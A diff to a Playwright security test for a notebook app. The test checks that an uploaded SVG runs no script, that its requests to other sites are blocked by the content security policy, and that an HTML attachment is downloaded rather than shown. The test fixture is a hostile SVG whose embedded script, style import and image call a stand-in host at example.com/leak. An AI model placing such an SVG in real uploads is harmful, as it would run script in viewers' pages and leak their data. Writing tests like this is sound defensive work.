@@ -1,6 +1,8 @@
 import { createHash } from "node:crypto";
 import { readFileSync } from "node:fs";
 
+import type { Request } from "@playwright/test";
+
 import { download, pngBytes, uploadAsset, utf8, type UploadFile } from "../../fixtures/assets";
 import { createNotebook } from "../../fixtures/notebooks";
 import { expect, test } from "../../fixtures/test";
@@ -16,10 +18,15 @@ import { newTeam } from "../../fixtures/workspaces";
 /** The policy of every content's answer. */
 const contentPolicy = "sandbox; default-src 'none'; img-src 'self' data:; media-src 'self'; style-src 'unsafe-inline'";
 
-/** An SVG whose script would retitle it and call another site, were it run. */
+/**
+ * An SVG whose script would retitle it and call another site, were it run, and which would load an image and a style
+ * sheet from another site.
+ */
 const svgBytes = utf8(
   `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><title>drawing</title>` +
+    `<style>@import url("https://example.com/leak.css");</style>` +
     `<script>document.title = "ran"; fetch("https://example.com/leak");</script>` +
+    `<image href="https://example.com/leak.png" width="10" height="10"/>` +
     `<rect width="10" height="10" fill="red"/></svg>`
 );
 
@@ -120,7 +127,7 @@ test("AS5 (API): each type's content is shown or downloaded under its name, sand
   }
 });
 
-test("AS5 (page): an SVG opened at its address runs no script and calls no other site; an HTML attachment is downloaded, not shown", async ({
+test("AS5 (page): an SVG opened at its address runs no script and loads nothing from another site; an HTML attachment is downloaded, not shown", async ({
   api,
   nervewiki,
   page,
@@ -130,10 +137,23 @@ test("AS5 (page): an SVG opened at its address runs no script and calls no other
   const notebook = await createNotebook(api, pat, workspace.slug, "Plans");
   const svg = await uploadAsset(api, pat, notebook.id, { name: "drawing.svg", bytes: svgBytes });
   const html = await uploadAsset(api, pat, notebook.id, { name: "page.html", bytes: htmlBytes, type: "text/html" });
-  const elsewhere: string[] = [];
+  // What came of each request to another site: Chromium reports one the
+  // policy blocks as a request that failed, for "csp".
+  const elsewhere = new Map<string, string>();
+  const other = (request: Request) => new URL(request.url()).origin !== new URL(nervewiki.baseURL).origin;
   page.on("request", (request) => {
-    if (new URL(request.url()).origin !== new URL(nervewiki.baseURL).origin) {
-      elsewhere.push(request.url());
+    if (other(request)) {
+      elsewhere.set(request.url(), "sent");
+    }
+  });
+  page.on("requestfailed", (request) => {
+    if (other(request)) {
+      elsewhere.set(request.url(), request.failure()?.errorText ?? "failed");
+    }
+  });
+  page.on("response", (response) => {
+    if (other(response.request())) {
+      elsewhere.set(response.url(), `answered ${response.status()}`);
     }
   });
 
@@ -150,12 +170,30 @@ test("AS5 (page): an SVG opened at its address runs no script and calls no other
   expect(downloaded.suggestedFilename()).toBe("page.html");
   expect(readFileSync(await downloaded.path())).toEqual(Buffer.from(htmlBytes));
   expect(page.url(), "the page stays on the SVG").toBe(svgURL);
-  expect(elsewhere, "requests to another site").toEqual([]);
+  await expect
+    .poll(() => Object.fromEntries(elsewhere), { message: "the requests to another site, each blocked" })
+    .toEqual({
+      "https://example.com/leak.css": "csp",
+      "https://example.com/leak.png": "csp",
+    });
 
   // Chromium says the sandbox blocked the SVG's script, and the scripts the
-  // watch puts in every document: that alone, once for each.
+  // watch puts in every document, once for each; and that the policy
+  // refused the other site's image and style sheet: that alone.
   const blocked = `Blocked script execution in '${svgURL}' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.`;
-  expect(pageWatch.consoleErrors.length, "the blocked scripts").toBeGreaterThan(0);
-  expect(new Set(pageWatch.consoleErrors)).toEqual(new Set([blocked]));
-  pageWatch.expectConsole({ errors: pageWatch.consoleErrors.map(() => blocked) });
+  const refused = [
+    /^(Refused to load|Loading) the image 'https:\/\/example\.com\/leak\.png' (because it )?violates the following Content Security Policy directive: "img-src 'self' data:"/,
+    /^(Refused to load|Loading) the stylesheet 'https:\/\/example\.com\/leak\.css' (because it )?violates the following Content Security Policy directive: "style-src 'unsafe-inline'"/,
+  ];
+  await expect
+    .poll(() => refused.map((message) => pageWatch.consoleErrors.some((error) => message.test(error))), {
+      message: "the policy's refusals",
+    })
+    .toEqual([true, true]);
+  expect(pageWatch.consoleErrors, "the blocked scripts").toContain(blocked);
+  const unknown = pageWatch.consoleErrors.filter(
+    (error) => error !== blocked && !refused.some((message) => message.test(error))
+  );
+  expect(unknown, "other console errors").toEqual([]);
+  pageWatch.expectConsole({ errors: [...pageWatch.consoleErrors] });
 });
